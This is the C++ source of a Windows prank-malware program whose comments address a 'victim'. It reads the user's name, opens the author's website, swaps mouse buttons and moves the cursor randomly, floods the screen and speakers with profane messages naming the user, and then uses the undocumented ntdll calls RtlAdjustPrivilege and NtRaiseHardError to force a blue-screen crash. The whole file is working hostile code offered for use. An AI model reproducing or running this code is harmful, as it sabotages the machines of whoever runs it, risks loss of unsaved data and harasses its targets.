////////////////////////////////////////////
/* I was bored, so I made this. Have fun. */
/*          Made by: Tero Jokela          */
////////////////////////////////////////////
#include <Windows.h>
#include <string>
#include <thread>
#include <random>
#include <sapi.h>


// Our external functions needed to trigger BSOD
#pragma comment(lib, "ntdll.lib")
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);


int screenWidth = 0;
int screenHeight = 0;

// Our random number generator
std::default_random_engine generator;

// Holds our victim's Windows username
char username[256];
DWORD lpnSize = sizeof(username);


// Force a BSOD
void BSOD()
{
	// Useless for our purpose, but required
	BOOLEAN b;
	ULONG r;

	// Enable SeShutdownPrivilege
	RtlAdjustPrivilege(19, TRUE, FALSE, &b);

	// Force the BSOD / shutdown
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &r);
}


// Say some annoying stuff via Text-To-Speech with different speeds and pitches
void AnnoyingTTS()
{
	ISpVoice * voice;

	// Failed to initialize TTS
	if (FAILED(::CoInitialize(NULL)))
		return;

	std::uniform_int_distribution<int> rangeSpeed(0, 5);
	std::uniform_int_distribution<int> rangePitch(-50, 50);
	bool LoveOrFuck = false;

	// Create the voice
	HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (LPVOID*)&voice);
	if (SUCCEEDED(hr))
		for (;;)
		{
			// Create some annoying text with a random speed and pitch
			std::wstring text = L"<volume level='150'><rate speed='" + std::to_wstring(rangeSpeed(generator)) + L"'/><pitch middle='"
								+ std::to_wstring(rangePitch(generator)) + L"'/>" + (LoveOrFuck ? L"Fuck" : L"I love") + L" you ";

			// Say it
			voice->Speak(text.c_str(), SPF_IS_XML, NULL);

			LoveOrFuck = !LoveOrFuck;
		}
	else
		return;

	::CoUninitialize();
}


// Move the cursor to random locations, removing all hope of using it
void AnnoyingMouse()
{
	// Swap left click and right click
	SwapMouseButton(TRUE);

	std::uniform_int_distribution<int> rangeMouseX(0, screenWidth);
	std::uniform_int_distribution<int> rangeMouseY(0, screenHeight);

	// Prepare an input
	INPUT input;
	input.type = INPUT_MOUSE;
	input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
	input.mi.dwExtraInfo = NULL;
	input.mi.mouseData = NULL;
	input.mi.time = NULL;

	for (;;)
	{
		// Get random positions for the mouse
		input.mi.dx = (LONG)(rangeMouseX(generator) * (65536.f / GetSystemMetrics(SM_CXSCREEN)));
		input.mi.dy = (LONG)(rangeMouseY(generator) * (65536.f / GetSystemMetrics(SM_CYSCREEN)));
		
		// Move the mouse
		SendInput(1, &input, sizeof(INPUT));

		std::this_thread::sleep_for(std::chrono::microseconds(10));
	}
}


// Draw a bunch of annoying text to the screen
void AnnoyingText()
{
	std::uniform_int_distribution<int> rangeX(-100, screenWidth);
	std::uniform_int_distribution<int> rangeY(0, screenHeight);
	std::uniform_int_distribution<int> LoveOrFuck(0, 1);
	std::uniform_int_distribution<DWORD> rangeColor(0x000000, 0xFFFFFF);

	// We'll draw to this (I know, it's probably the worst way possible but it _kinda_ works)
	HWND hwnd = CreateWindow(NULL, NULL, NULL, 0, 0, screenWidth, screenHeight, NULL, NULL, NULL, NULL);
	HDC hdc = GetDC(hwnd);

	for (;;)
	{
		std::string text = (std::string)(LoveOrFuck(generator) ? "Fuck" : "I love") + " you " + username + " <3";

		// Random color
		SetTextColor(hdc, rangeColor(generator));
		// Draw the text to a random position on the screen
		TextOut(hdc, rangeX(generator), rangeY(generator), text.c_str(), text.length());
		std::this_thread::sleep_for(std::chrono::microseconds(10));
	}
}


// Our program's entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow)
{
	generator.seed((unsigned)time(NULL));

	// Get the victim's Windows username
	GetUserNameA((LPSTR)username, &lpnSize);

	// Get the screen resolution
	screenWidth = GetSystemMetrics(SM_CXSCREEN);
	screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// Open my website
	ShellExecuteA(0, 0, "http://lerspi.wtf/", 0, 0, SW_HIDE);

	// Because the BSOD isn't instant, we need something to keep the victim entertained for a bit
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AnnoyingText, NULL, 0, NULL);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AnnoyingMouse, NULL, 0, NULL);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AnnoyingTTS, NULL, 0, NULL);

	// Give the victim some time to realize what's happening
	std::this_thread::sleep_for(std::chrono::seconds(7));

	// Bye
	BSOD();
}